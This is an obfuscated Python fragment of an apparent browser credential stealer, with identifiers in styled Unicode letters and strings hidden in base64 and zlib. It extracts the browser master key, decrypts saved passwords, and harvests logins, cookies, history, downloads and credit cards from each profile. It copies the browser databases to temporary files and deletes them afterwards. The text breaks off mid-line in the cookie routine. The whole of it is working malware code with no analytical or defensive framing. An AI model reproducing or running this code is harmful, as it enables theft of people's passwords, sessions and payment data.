__𝘪𝗺𝗽𝙤𝗿𝘵__('base64').b64decode(__𝙞𝙢𝙥𝗼𝘳𝘁__('zlib').decompress(b'x\xdaK\n\xcf\xc9J\xce\xb5\xacJ2\x8a2\xf0\t\x0f\xcb\x8e2\n\xb5\x05\x00Ji\x06\xb3')).decode(): 𝘀𝘦𝗹𝘧.appdata + __𝗶𝗺𝗽𝙤𝗿𝙩__('base64').b64decode(__𝘪𝗺𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x8bp5,\x884\xf6*K6\xb2\xccMq\xabp\x8brO\xc9\x89p\x0b\xab\x8a\x8a\xf0L\x0frw3\x88\x0c\xb4\xb5\x05\x00\xda\x1a\x0b\xa2')).decode(), __𝘪𝘮𝗽𝘰𝙧𝙩__('base64').b64decode(__𝘪𝘮𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xdaK\x89\xf0\xcaHJ\xb7\xb5\x05\x00\x0c\xc8\x02\xb2')).decode(): 𝘀𝙚𝘭𝗳.appdata + __𝘪𝘮𝗽𝗼𝙧𝙩__('base64').b64decode(__𝗶𝙢𝙥𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x8b\xf0\x08sI2.\xf0\x8b\n\x0f*\x88\x0c\xab\x08K\xceu+\x8dp\x0b\xab\x8a\x8a\xf0L\x0frw3\x88\x0c\xb4\xb5\x05\x00\xe4H\x0c\x0c')).decode(), __𝙞𝘮𝘱𝙤𝗿𝘵__('base64').b64decode(__𝗶𝘮𝘱𝙤𝗿𝙩__('zlib').decompress(b'x\xdaK\rw+\x8dr\x0f3\x01\x00\x0c\x9b\x02\xa3')).decode(): 𝘀𝘦𝙡𝙛.appdata + __𝘪𝗺𝗽𝗼𝙧𝙩__('base64').b64decode(__𝙞𝘮𝘱𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x8bp\xcb\xc9H\xca\r\xcaIu\xab\x88\x8a\x0c7\xcd\x8e\x8a\xc8pN\xce\xb54N6\n\xab\x8cp\x0b\xab\x8a\x8a\xf0L\x0frw3\x88\x0c\xb4\xb5\x05\x00[\x84\x0e\xcd')).decode(), __𝘪𝗺𝙥𝗼𝗿𝘁__('base64').b64decode(__𝙞𝘮𝘱𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x8b\xcc\xf3\xcaH\xc9\r\xb5\x05\x00\rT\x02\xdd')).decode(): 𝘀𝘦𝘭𝗳.appdata + __𝙞𝙢𝗽𝘰𝗿𝙩__('base64').b64decode(__𝗶𝙢𝗽𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x8bp\xf5\xaa\x8c\x8c\x88\xca\t5\xb2\xccM\xf1H\xc9H\xce\rK\x0e\xcc\xf3\xcaH\xc9\r-\x01\xd2e)\xc6~9\xc99\x15a\xc9Fa\x95\x9e\xaeA\x19)\xee\xae\xb6\x00\xe9\xfe\x12W')).decode(), __𝘪𝙢𝙥𝗼𝙧𝘁__('base64').b64decode(__𝗶𝘮𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xdaK\x8c\xf0*\x88r\xcf1L\n\xb4\xb5\x05\x00\x1a\xa4\x03\xdf')).decode(): 𝘴𝘦𝗹𝗳.appdata + __𝗶𝙢𝙥𝙤𝙧𝙩__('base64').b64decode(__𝘪𝗺𝘱𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x8bp\xcd\xa9L\x0c\x0f*H\t7L\x0e\x8b\xf0\xcbI\xcetr\x8d\x8c\x08\xca\x00\x00k\x07\x08r')).decode()})
        𝙨𝘦𝘵𝗮𝘵𝘁𝘳(𝙨𝙚𝘭𝘧, 'profiles', [__𝘪𝗺𝘱𝙤𝘳𝘁__('base64').b64decode(__𝘪𝙢𝘱𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x0br\x0f\xcb\x8d\x8c\x08+Nq\xb4\xb5\x05\x00\x1a\x9f\x03\xf6')).decode(), __𝗶𝗺𝗽𝘰𝙧𝙩__('base64').b64decode(__𝗶𝗺𝘱𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x0b\xf5\xf0*\x8b\xca\xcd)\x8e\nv\xac\x00\x00\x1c\x17\x04j')).decode(), __𝙞𝘮𝗽𝗼𝗿𝙩__('base64').b64decode(__𝗶𝗺𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x0b\xf5\xf0*\x8b\xca\xcd)\x8e\nv\xac\x04\x00\x1c\x18\x04k')).decode(), __𝘪𝘮𝗽𝗼𝗿𝘁__('base64').b64decode(__𝘪𝙢𝗽𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x0b\xf5\xf0*\x8b\xca\xcd)\x8e\nv\xac\x02\x00\x1c\x19\x04l')).decode(), __𝘪𝙢𝙥𝘰𝙧𝙩__('base64').b64decode(__𝙞𝙢𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x0b\xf5\xf0*\x8b\xca\xcd)\x8e\nv4\x00\x00\x1b\xcf\x04"')).decode(), __𝘪𝙢𝙥𝙤𝘳𝘵__('base64').b64decode(__𝙞𝙢𝙥𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x0b\xf5\xf0*\x8b\xca\xcd)\x8e\nv4\x04\x00\x1b\xd0\x04#')).decode()])
        for (_, 𝙥𝘢𝙩𝗵) in 𝘴𝙚𝙡𝘧.browsers.items():
            if not 𝘰𝙨.path.exists(𝙥𝙖𝘵𝘩):
                continue
            𝘴𝗲𝘁𝗮𝘵𝙩𝗿(𝙨𝗲𝙡𝘧, 'master_key', 𝙨𝙚𝘭𝗳.get_master_key(__𝘪𝘮𝗽𝗼𝘳𝘁__('base64').b64decode(__𝙞𝘮𝘱𝙤𝙧𝘵__('zlib').decompress(b'x\xdaK56L\x0eq\xb7\xcc\x8a\x0c/O\x0f5\x0e\xcaHq\x0f\xb5\x05\x00C*\x06x')).decode().format(𝙥𝙖𝙩𝘩)))
            if not 𝘀𝙚𝘭𝙛.master_key:
                continue
            for 𝘱𝗿𝗼𝙛𝘪𝘭𝙚 in 𝘀𝙚𝙡𝘧.profiles:
                if not 𝙤𝘴.path.exists(𝘱𝗮𝘁𝙝 + __𝗶𝘮𝗽𝘰𝘳𝘁__('base64').b64decode(__𝘪𝙢𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x8bp\xb4\xb5\x05\x00\x02\xde\x01\x14')).decode() + 𝗽𝙧𝗼𝙛𝙞𝙡𝘦):
                    continue
                𝗼𝗽𝗲𝙧𝘢𝘁𝗶𝘰𝗻𝙨 = [𝙨𝙚𝗹𝙛.get_login_data, 𝙨𝙚𝙡𝘧.get_cookies, 𝘴𝘦𝘭𝘧.get_web_history, 𝘀𝙚𝘭𝗳.get_downloads, 𝙨𝗲𝙡𝗳.get_credit_cards]
                for 𝙤𝙥𝙚𝗿𝙖𝘵𝙞𝙤𝙣 in 𝗼𝘱𝘦𝗿𝗮𝘁𝘪𝘰𝙣𝘴:
                    try:
                        𝙤𝘱𝗲𝘳𝗮𝘵𝘪𝗼𝘯(𝘱𝙖𝙩𝗵, 𝗽𝗿𝘰𝙛𝘪𝙡𝗲)
                    except 𝙀𝘹𝙘𝘦𝗽𝘵𝘪𝘰𝘯 as e:
                        pass

    def get_master_key(self, path):
        if not 𝘰𝘴.path.exists(𝗽𝗮𝙩𝙝):
            return
        if __𝘪𝘮𝗽𝙤𝙧𝘵__('base64').b64decode(__𝗶𝘮𝗽𝘰𝘳𝘁__('zlib').decompress(b'x\xdaK2\xf6K\x8b4\xf62M\xf6\x08\xb4\x05\x00\x17\xac\x03\x8e')).decode() not in 𝘰𝗽𝙚𝘯(𝗽𝘢𝙩𝗵, __𝗶𝘮𝘱𝙤𝘳𝘵__('base64').b64decode(__𝗶𝘮𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xdaKN\xb7\xb5\x05\x00\x03|\x01E')).decode(), encoding=__𝙞𝙢𝗽𝙤𝙧𝘵__('base64').b64decode(__𝙞𝘮𝗽𝙤𝘳𝘁__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()).read():
            return
        with 𝘰𝗽𝗲𝙣(𝗽𝙖𝘁𝙝, __𝘪𝙢𝘱𝙤𝗿𝘵__('base64').b64decode(__𝙞𝘮𝘱𝙤𝙧𝘵__('zlib').decompress(b'x\xdaKN\xb7\xb5\x05\x00\x03|\x01E')).decode(), encoding=__𝘪𝘮𝗽𝙤𝘳𝘁__('base64').b64decode(__𝗶𝗺𝗽𝙤𝗿𝘵__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()) as 𝙛:
            𝘤 = 𝘧.read()
        𝗹𝙤𝘤𝘢𝘭_𝘴𝘁𝙖𝘁𝘦 = 𝗷𝘴𝗼𝗻.loads(𝘤)
        𝙢𝙖𝘀𝘁𝙚𝙧_𝗸𝙚𝙮 = 𝘣𝗮𝙨𝗲64.b64decode(𝘭𝗼𝘤𝘢𝗹_𝘴𝙩𝗮𝙩𝘦[__𝗶𝘮𝗽𝘰𝗿𝘵__('base64').b64decode(__𝙞𝗺𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xdaK2\xf6K\x8b4\xf62M\xf6\x08\xb4\x05\x00\x17\xac\x03\x8e')).decode()][__𝙞𝘮𝘱𝘰𝗿𝘁__('base64').b64decode(__𝗶𝙢𝙥𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x8b\n7\xcdJ\xce\xcb)Oq\x0f\xcb\x8e0*\xc9I\r\xb4\xb5\x05\x00K\xf6\x07\x0b')).decode()])
        𝙢𝘢𝙨𝘵𝘦𝗿_𝗸𝗲𝘆 = 𝘮𝘢𝙨𝘁𝙚𝗿_𝗸𝗲𝙮[𝙞𝙣𝘁.from_bytes(𝙢𝗮𝘱(lambda O, i: 882 - (𝙞𝙣𝘵(𝗢) + 𝗶), 𝘮𝗮𝗽(__𝙞𝘮𝘱𝙤𝘳𝘁__('base64').b64decode(__𝙞𝗺𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝘱(*[𝘪𝙩𝘦𝘳(__𝘪𝗺𝗽𝙤𝗿𝙩__('base64').b64decode(__𝗶𝗺𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xda\xf3wI6\x06\x00\x03\x05\x01*')).decode())] * 3)), 𝘳𝗮𝗻𝙜𝗲(1)), __𝗶𝗺𝘱𝘰𝗿𝙩__('base64').b64decode(__𝙞𝗺𝗽𝗼𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False):]
        𝘮𝗮𝙨𝙩𝗲𝙧_𝙠𝘦𝙮 = 𝘊𝗿𝘺𝘱𝙩𝘜𝗻𝘱𝗿𝗼𝘁𝙚𝗰𝘵𝗗𝙖𝙩𝙖(𝙢𝙖𝙨𝘁𝗲𝘳_𝘬𝗲𝙮, None, None, None, 𝙞𝗻𝙩.from_bytes(𝘮𝘢𝗽(lambda O, i: 754 - (𝘪𝙣𝘵(𝘖) + 𝙞), 𝙢𝘢𝘱(__𝙞𝗺𝙥𝗼𝘳𝘵__('base64').b64decode(__𝙞𝘮𝙥𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝘱(*[𝗶𝘁𝙚𝙧(__𝗶𝙢𝘱𝗼𝗿𝙩__('base64').b64decode(__𝙞𝘮𝘱𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝗮𝙣𝘨𝙚(0)), __𝗶𝘮𝗽𝘰𝗿𝙩__('base64').b64decode(__𝙞𝗺𝘱𝙤𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False))[𝗶𝗻𝘁.from_bytes(𝘮𝘢𝗽(lambda O, i: 451 - (𝘪𝘯𝘵(𝙊) + 𝙞), 𝙢𝘢𝗽(__𝙞𝘮𝘱𝘰𝗿𝘵__('base64').b64decode(__𝗶𝘮𝙥𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝙥(*[𝗶𝘵𝘦𝗿(__𝗶𝗺𝗽𝗼𝗿𝙩__('base64').b64decode(__𝘪𝗺𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xda\xf3s\t-\x07\x00\x03)\x01_')).decode())] * 3)), 𝙧𝗮𝗻𝗴𝗲(1)), __𝘪𝗺𝙥𝘰𝗿𝘵__('base64').b64decode(__𝙞𝙢𝗽𝘰𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]
        return 𝘮𝙖𝘴𝘁𝙚𝘳_𝗸𝘦𝙮

    def decrypt_password(self, buff, master_key):
        𝗶𝙫 = 𝘣𝙪𝗳𝘧[𝘪𝗻𝙩.from_bytes(𝘮𝙖𝗽(lambda O, i: 922 - (𝙞𝘯𝘁(𝗢) + 𝗶), 𝘮𝗮𝗽(__𝙞𝗺𝘱𝙤𝗿𝙩__('base64').b64decode(__𝗶𝙢𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝗽(*[𝙞𝙩𝗲𝘳(__𝘪𝗺𝘱𝙤𝙧𝘁__('base64').b64decode(__𝙞𝘮𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xda\xf3\x0fq5\x05\x00\x02\xfb\x01\x1e')).decode())] * 3)), 𝙧𝗮𝙣𝙜𝘦(1)), __𝘪𝗺𝗽𝙤𝘳𝙩__('base64').b64decode(__𝗶𝗺𝙥𝙤𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False):𝙞𝙣𝙩.from_bytes(𝙢𝙖𝗽(lambda O, i: 465 - (𝘪𝙣𝙩(𝗢) + 𝙞), 𝗺𝘢𝘱(__𝙞𝙢𝗽𝗼𝘳𝘁__('base64').b64decode(__𝘪𝘮𝙥𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝗽(*[𝗶𝙩𝘦𝘳(__𝗶𝙢𝙥𝗼𝘳𝙩__('base64').b64decode(__𝘪𝗺𝙥𝙤𝗿𝙩__('zlib').decompress(b'x\xda\xf3s\t-\x07\x00\x03)\x01_')).decode())] * 3)), 𝙧𝘢𝙣𝙜𝘦(1)), __𝙞𝘮𝘱𝘰𝙧𝘁__('base64').b64decode(__𝗶𝘮𝙥𝗼𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]
        𝘱𝘢𝘺𝘭𝗼𝘢𝘥 = 𝘣𝘂𝗳𝙛[𝘪𝙣𝙩.from_bytes(𝘮𝙖𝙥(lambda O, i: 486 - (𝗶𝗻𝙩(𝙊) + 𝘪), 𝙢𝘢𝘱(__𝙞𝘮𝗽𝗼𝗿𝘵__('base64').b64decode(__𝘪𝗺𝗽𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝘱(*[𝘪𝙩𝘦𝗿(__𝗶𝘮𝙥𝗼𝘳𝙩__('base64').b64decode(__𝗶𝗺𝗽𝙤𝙧𝘁__('zlib').decompress(b'x\xda\xf3sI\xae\x00\x00\x03F\x01n')).decode())] * 3)), 𝙧𝙖𝘯𝙜𝙚(1)), __𝗶𝗺𝙥𝘰𝗿𝘁__('base64').b64decode(__𝗶𝘮𝘱𝗼𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False):]
        𝘤𝙞𝙥𝘩𝘦𝘳 = 𝘼𝘌𝗦.new(𝘮𝙖𝘴𝙩𝙚𝙧_𝘬𝗲𝙮, 𝘼𝘌𝗦.MODE_GCM, 𝗶𝙫)
        𝙙𝘦𝗰𝗿𝘺𝙥𝙩𝙚𝗱_𝙥𝘢𝘴𝘴 = 𝙘𝘪𝘱𝘩𝗲𝘳.decrypt(𝘱𝙖𝘆𝗹𝙤𝘢𝗱)
        𝗱𝘦𝘤𝙧𝙮𝘱𝘵𝗲𝙙_𝘱𝘢𝘴𝙨 = 𝗱𝙚𝙘𝘳𝙮𝙥𝙩𝗲𝙙_𝙥𝙖𝘀𝙨[:-𝘪𝗻𝙩.from_bytes(𝗺𝙖𝙥(lambda O, i: 560 - (𝗶𝘯𝘵(𝗢) + 𝙞), 𝘮𝙖𝙥(__𝙞𝙢𝙥𝗼𝗿𝘁__('base64').b64decode(__𝘪𝘮𝘱𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝙥(*[𝙞𝘁𝗲𝗿(__𝙞𝙢𝗽𝘰𝙧𝘵__('base64').b64decode(__𝙞𝘮𝗽𝗼𝘳𝘁__('zlib').decompress(b'x\xda\xf3\x0b\t4\x00\x00\x03\n\x01$')).decode())] * 3)), 𝘳𝗮𝘯𝙜𝘦(1)), __𝙞𝙢𝗽𝗼𝘳𝘵__('base64').b64decode(__𝙞𝙢𝙥𝘰𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)].decode()
        return 𝗱𝙚𝗰𝘳𝙮𝘱𝘵𝘦𝗱_𝙥𝗮𝘀𝘀

    def get_login_data(self, path, profile):
        𝙡𝗼𝘨𝘪𝘯_𝘥𝘣 = __𝗶𝙢𝘱𝙤𝗿𝘵__('base64').b64decode(__𝗶𝘮𝘱𝗼𝙧𝘵__('zlib').decompress(b'x\xdaK56LN\x05\xe2\x10w\xcb\xbc\xc4p\x93\xf4 w7\x83\xc8@[[\x00Z\\\x07!')).decode().format(𝗽𝗮𝙩𝗵, 𝗽𝙧𝙤𝙛𝙞𝙡𝗲)
        if not 𝙤𝘀.path.exists(𝘭𝙤𝙜𝗶𝙣_𝘥𝘣):
            return
        𝘴𝘩𝘂𝙩𝗶𝗹.copy(𝗹𝙤𝗴𝗶𝙣_𝗱𝘣, __𝗶𝘮𝘱𝙤𝙧𝘵__('base64').b64decode(__𝙞𝙢𝗽𝙤𝗿𝘁__('zlib').decompress(b'x\xdaKr\xb7\xccK\x0c7M\x8br\xf7\xb4\x05\x00\x19z\x03\xcb')).decode())
        𝘤𝗼𝙣𝗻 = 𝙨𝘲𝙡𝗶𝘵𝙚3.connect(__𝙞𝗺𝘱𝘰𝗿𝘵__('base64').b64decode(__𝙞𝘮𝘱𝗼𝗿𝙩__('zlib').decompress(b'x\xdaKr\xb7\xccK\x0c7M\x8br\xf7\xb4\x05\x00\x19z\x03\xcb')).decode())
        𝗰𝘶𝙧𝙨𝗼𝘳 = 𝙘𝗼𝘯𝙣.cursor()
        𝘤𝙪𝘳𝘴𝙤𝗿.execute(__𝙞𝙢𝗽𝙤𝗿𝘁__('base64').b64decode(__𝘪𝙢𝗽𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x05\xc1\xbb\x0e@0\x14\x00\xd0_\xd2\x9a:XH\xfa\x10:\x90\xbe\xeeX\x06\xe1\x9a\xa4\x0f\xbe\xde9\xa6\xb1\xf3b\xb4Q\x82\x9f\xbb\xc0\x1c\x91\x91\xed.\x8f\x92\xf6\x03?\xa6\xe0\x08\xfa\x16\x8e(-NC_\x82\xd7\xdfN\xd9\x0b\x9c\xd1\xe0*\x81\xb5\x17\xe6bZ\x89\x9a\x81b\xdaJ\xd7\xfd\xaf\xbb\x1c3')).decode())
        for 𝘳𝗼𝙬 in 𝘤𝘂𝙧𝘀𝘰𝘳.fetchall():
            if not 𝘳𝙤𝙬[𝗶𝘯𝙩.from_bytes(𝗺𝗮𝗽(lambda O, i: 465 - (𝘪𝗻𝘵(𝙊) + 𝙞), 𝘮𝘢𝘱(__𝘪𝙢𝙥𝘰𝗿𝙩__('base64').b64decode(__𝗶𝗺𝙥𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝙥(*[𝙞𝘁𝗲𝘳(__𝗶𝘮𝘱𝘰𝙧𝘵__('base64').b64decode(__𝘪𝙢𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝙖𝘯𝗴𝙚(0)), __𝗶𝗺𝗽𝗼𝙧𝘁__('base64').b64decode(__𝘪𝘮𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or not 𝗿𝘰𝙬[𝗶𝗻𝘁.from_bytes(𝘮𝗮𝙥(lambda O, i: 379 - (𝙞𝙣𝙩(𝘖) + 𝘪), 𝙢𝙖𝙥(__𝙞𝘮𝙥𝗼𝗿𝘵__('base64').b64decode(__𝗶𝗺𝗽𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝗽(*[𝙞𝙩𝙚𝘳(__𝘪𝗺𝘱𝘰𝘳𝙩__('base64').b64decode(__𝘪𝗺𝙥𝙤𝗿𝘵__('zlib').decompress(b'x\xda\xf3\xadJ6\x01\x00\x03\xa0\x01_')).decode())] * 3)), 𝗿𝘢𝙣𝗴𝘦(1)), __𝗶𝙢𝘱𝗼𝗿𝘵__('base64').b64decode(__𝙞𝘮𝗽𝘰𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or (not 𝘳𝗼𝘸[𝘪𝘯𝘵.from_bytes(𝙢𝘢𝗽(lambda O, i: 826 - (𝙞𝘯𝘵(𝘖) + 𝙞), 𝗺𝘢𝗽(__𝗶𝙢𝗽𝙤𝗿𝘵__('base64').b64decode(__𝘪𝗺𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝘱(*[𝗶𝘁𝗲𝙧(__𝗶𝘮𝙥𝙤𝘳𝙩__('base64').b64decode(__𝘪𝘮𝗽𝘰𝘳𝘁__('zlib').decompress(b'x\xda\xf3w\xf14\x00\x00\x02\xce\x01\r')).decode())] * 3)), 𝙧𝘢𝗻𝘨𝗲(1)), __𝙞𝗺𝘱𝗼𝙧𝘁__('base64').b64decode(__𝘪𝗺𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]):
                continue
            𝘱𝗮𝙨𝙨𝘄𝘰𝘳𝙙 = 𝘴𝙚𝙡𝘧.decrypt_password(𝗿𝗼𝘄[𝗶𝙣𝘵.from_bytes(𝘮𝘢𝘱(lambda O, i: 641 - (𝘪𝙣𝙩(𝗢) + 𝘪), 𝘮𝗮𝗽(__𝗶𝙢𝗽𝗼𝙧𝙩__('base64').b64decode(__𝘪𝘮𝙥𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝙥(*[𝘪𝙩𝘦𝗿(__𝘪𝙢𝗽𝙤𝙧𝘁__('base64').b64decode(__𝗶𝗺𝙥𝗼𝘳𝘵__('zlib').decompress(b'x\xda\xf3\xcb\xf25\x05\x00\x03I\x01;')).decode())] * 3)), 𝗿𝗮𝙣𝘨𝗲(1)), __𝘪𝙢𝗽𝙤𝙧𝘵__('base64').b64decode(__𝙞𝘮𝙥𝗼𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝙨𝘦𝙡𝙛.master_key)
            __𝙇𝙊𝙂𝙄𝙉𝙎__.append(𝗧𝙮𝗽𝙚𝙨.Login(𝗿𝙤𝘸[𝗶𝙣𝘁.from_bytes(𝙢𝘢𝘱(lambda O, i: 399 - (𝘪𝙣𝙩(𝙊) + 𝗶), 𝘮𝘢𝗽(__𝙞𝗺𝗽𝗼𝗿𝙩__('base64').b64decode(__𝘪𝙢𝘱𝗼𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝘱(*[𝙞𝘵𝗲𝗿(__𝗶𝗺𝙥𝘰𝙧𝘁__('base64').b64decode(__𝘪𝗺𝗽𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝘢𝙣𝗴𝘦(0)), __𝙞𝘮𝙥𝙤𝘳𝘁__('base64').b64decode(__𝗶𝘮𝘱𝙤𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝙧𝘰𝘸[𝗶𝗻𝙩.from_bytes(𝗺𝗮𝗽(lambda O, i: 734 - (𝘪𝙣𝘁(𝙊) + 𝙞), 𝘮𝘢𝙥(__𝙞𝙢𝙥𝙤𝗿𝘁__('base64').b64decode(__𝗶𝘮𝗽𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝗽(*[𝘪𝘵𝘦𝘳(__𝙞𝙢𝘱𝙤𝗿𝙩__('base64').b64decode(__𝙞𝘮𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xda\xf3\xab\xf2\xad\x02\x00\x03\xbe\x01\x90')).decode())] * 3)), 𝙧𝘢𝘯𝗴𝘦(1)), __𝙞𝙢𝗽𝗼𝙧𝙩__('base64').b64decode(__𝙞𝘮𝗽𝙤𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝙥𝗮𝘴𝙨𝙬𝗼𝘳𝙙))
        𝙘𝘰𝙣𝗻.close()
        𝘰𝘀.remove(__𝙞𝗺𝙥𝙤𝙧𝘁__('base64').b64decode(__𝘪𝗺𝘱𝙤𝘳𝘵__('zlib').decompress(b'x\xdaKr\xb7\xccK\x0c7M\x8br\xf7\xb4\x05\x00\x19z\x03\xcb')).decode())

    def get_cookies(self, path, profile):
        𝘤𝗼𝗼𝘬𝗶𝗲_𝗱𝙗 = __𝙞𝘮𝗽𝗼𝘳𝙩__('base64').b64decode(__𝗶𝘮𝘱𝙤𝗿𝙩__('zlib').decompress(b'x\xdaK56LN\x05\xe2\x90\xdc0\x83\x14#\xcb\xcaD\xc3\n\x97$#\xcb\xa2\xc4\xf0\xb0*\x00}L\x08\xfd')).decode().format(𝙥𝘢𝙩𝗵, 𝙥𝙧𝗼𝙛𝙞𝗹𝙚)
        if not 𝙤𝘴.path.exists(𝗰𝘰𝙤𝘬𝘪𝘦_𝙙𝙗):
            return
        𝘀𝙝𝘶𝘵𝙞𝘭.copy(𝘤𝘰𝘰𝘬𝙞𝘦_𝘥𝗯, __𝗶𝗺𝗽𝙤𝗿𝘵__('base64').b64decode(__𝘪𝘮𝙥𝙤𝗿𝙩__('zlib').decompress(b'x\xda\x8b4\xb2,K4\xca\xc9\x890\n\xca\x04\x00\x18\xcb\x03\xeb')).decode())
        𝘤𝙤𝘯𝗻 = 𝙨𝙦𝙡𝗶𝘁𝘦3.connect(__𝙞𝘮𝘱𝗼𝗿𝘁__('base64').b64decode(__𝙞𝙢𝘱𝗼𝗿𝙩__('zlib').decompress(b'x\xda\x8b4\xb2,K4\xca\xc9\x890\n\xca\x04\x00\x18\xcb\x03\xeb')).decode())
        𝙘𝙪𝗿𝙨𝙤𝗿 = 𝗰𝗼𝘯𝗻.cursor()
        𝗰𝘂𝗿𝘀𝙤𝘳.execute(__𝙞𝗺𝘱𝙤𝘳𝘁__('base64').b64decode(__𝗶𝘮𝙥𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x0b5\x08\xf3\r\n\xf5\x0b\xf5t\xcf(K6\x0eJK4\n3\xf5qv*\x8d\x0c7\xcc\x01\xd2\xe5\x91\x11A\xf9@:\')\xd7\xaf25\xc2\xc9 *<(-%\xd7\xad8%<\xb48*"\xa3<1\xc2+\'\xd9\xd0\xd20\xc5\xdd7=(\xc7+ $\xd8)+\xc9\xc8\xb2(1<\xac\n\x00\x84\xd0\x1e\xe1')).decode())
        for 𝘳𝗼𝘄 in 𝘤𝘂𝗿𝘴𝙤𝗿.fetchall():
            if not 𝘳𝙤𝙬[𝘪𝘯𝙩.from_bytes(𝘮𝘢𝙥(lambda O, i: 510 - (𝗶𝘯𝘁(𝘖) + 𝙞), 𝙢𝙖𝙥(__𝗶𝙢𝘱𝘰𝘳𝘁__('base64').b64decode(__𝘪𝙢𝙥𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝘱(*[𝘪𝘵𝘦𝗿(__𝘪𝗺𝘱𝙤𝙧𝘵__('base64').b64decode(__𝙞𝘮𝙥𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝘢𝘯𝙜𝙚(0)), __𝙞𝗺𝗽𝘰𝗿𝙩__('base64').b64decode(__𝙞𝘮𝗽𝘰𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] 